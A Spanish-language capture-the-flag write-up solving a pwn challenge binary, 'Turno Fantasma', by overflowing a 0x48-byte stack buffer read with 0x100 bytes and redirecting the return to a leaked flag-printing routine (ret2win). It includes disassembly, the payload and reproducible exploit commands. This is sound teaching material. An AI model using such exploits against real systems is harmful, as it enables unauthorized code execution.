# Desafío 14 — Turno Fantasma

| Campo | Valor |
|---|---|
| Categoría | pwn / stack overflow + ret2win |
| Dificultad | fácil-media |
| Puntos | — |
| Estado | ✅ resuelto |
| Flag | `flag{ejemplo}` |
| Servicio | `nc <host> 31547` |

## Enunciado

> **Turno Fantasma** — Un turno fue retirado del registro. La última sesión quedó marcada como finalizada.
> El operador fue dado de baja y las comunicaciones debieron interrumpirse. Pero el servicio continúa
> respondiendo. Cada nueva conexión parece atravesar una rutina de cierre que nunca terminó de ejecutarse.
> Los registros no muestran actividad, aunque alguien —o algo— sigue atendiendo el canal.
> No hay constancia de un nuevo operador. Investiga el servicio. Descubre qué permanece activo y recupera
> la evidencia oculta.
>
> Archivo adjunto: `turno_fantasma`

## Reconocimiento

```
turno_fantasma: ELF 64-bit LSB executable, x86-64, statically linked, stripped
SHA256 0f6f5cc3b97adaf2626e312ec36773a21ff41ae38b47f8adc1c667ac39d8b696
```

`checksec`:

| RELRO | Canary | NX | PIE | FORTIFY |
|---|---|---|---|---|
| Partial | **No** | Sí | **No** | No |

Ejecución local:

```
+----------------------------------+
|       |
|   [22:00] ---> [  ??  ] ---> [06]|
+----------------------------------+
Turno retirado: 0x4018a5
Deja una observacion para el siguiente turno:
Observacion archivada.
```

Dos cadenas propias importantes (`strings`): `/tmp/flag`, `Flag no disponible.`, y el propio leak
`Turno retirado: %p`.

## Análisis

`main` (0x4019f4–0x401a62):

```c
puts(banner);
printf("Turno retirado: %p\n", 0x4018a5);   // filtra la rutina "retirada"
fcn_401906();                                // atención del canal
```

`main` solo muestra el cartel y delata con `%p` la dirección de la rutina **retirada** (el "turno
fantasma" que sigue respondiendo). Esa rutina, en `0x4018a5`, es justamente la que abre `/tmp/flag`
y la imprime:

```
0x4018a5  push rbx
0x4018a6  add  rsp, -0x80
0x4018aa  lea  rsi, [0x47ae08]      ; "r"
0x4018b1  lea  rdi, [0x479010]      ; "/tmp/flag"
0x4018b8  call fopen
...
```

La función que atiende cada conexión (0x401906) es el fallo:

```
0x401906  sub  rsp, 0x48
0x40190a  lea  rdi, "Deja una observacion..."
0x401911  call puts
0x401916  mov  rsi, rsp
0x401919  mov  edx, 0x100
0x40191e  mov  edi, 0
0x401923  call read            ; read(0, buf, 0x100)
0x401928  lea  rdi, "Observacion archivada."
0x40192f  call puts
0x401934  add  rsp, 0x48
0x401938  ret                 ; retorno sobrescrito
```

- Buffer local de **0x48** bytes, pero `read` acepta hasta **0x100**: desbordamiento de pila.
- Sin canary → se puede pisar la dirección de retorno sin detección.
- Sin PIE → `0x4018a5` es fijo (y además se filtra en el banner).
- NX activo → no shellcode: se reutiliza la rutina existente (**ret2win**).

Layout: 0x48 bytes de relleno + 8 bytes de dirección de retorno.

### Payload

```python
payload = b"A" * 0x48 + p64(0x4018a5)
```

Al retornar, el programa salta a la rutina retirada, que lee `/tmp/flag` y la imprime antes de terminar.

## Solución (pasos reproducibles)

```bash
# local (con /tmp/flag de prueba)
printf 'flag{ejemplo}\n' > /tmp/flag
python - <<'EOF'
import struct
open('work/payload_local.bin','wb').write(b'A'*0x48 + struct.pack('<Q',0x4018a5) + b'\n')
EOF
./turno_fantasma < work/payload_local.bin

# remoto
python solucion/exploit_turno.py <host> 31547
```

El script parsea el leak (`Turno retirado: 0x...`), arma el payload con offset `0x48` y extrae la flag
de la respuesta.

Salida remota:

```
Turno retirado: 0x4018a5
Deja una observacion para el siguiente turno:
Observacion archivada.
flag{ejemplo}
```

## Flag

```
flag{ejemplo}
```

## Evidencia y artefactos

| Ruta | Contenido |
|---|---|
| `turno_fantasma` | Binario entregado (686.168 B) |
| `solucion/exploit_turno.py` | Exploit remoto (leak + ret2win) |
| `work/payload_local.bin` | Payload de prueba local (81 B: 0x48 + `0x4018a5`) |
| `work/salida_remota.txt` | Transcripción de la ejecución remota |
| `flag.txt` | Flag del reto |

## Lecciones / notas

- **Rutina "retirada" que sigue en el binario**: el servicio "fantasma" es una función huérfana
  (`0x4018a5`) que ya no se llama desde el flujo normal, pero sigue mapeada y es alcanzable por un
  retorno corrupto; el propio programa filtra su dirección.
- **`read` con tamaño mayor que el frame**: 0x100 sobre 0x48 es un desbordamiento directo de la
  dirección de retorno; sin canary no hay fricción.
- **ret2win** es la vía natural con NX y sin PIE: no hace falta ROP ni shellcode.
- Comparación con el reto «Libro de Visitas» (mismo tamaño de binario y misma plantilla estática):
  allí el fallo era format string; aquí es un overflow clásico. Conviene revisar siempre el flujo real
  (`main` → función de atención) y no asumir que el mismo binario/base implica el mismo bug.

## Backups

| Archivo | Backup |
|---|---|
| `ctf/CONTEXTO_CTF.md` (índice) | `ctf/backups/CONTEXTO_CTF.md.20261023-183751` |
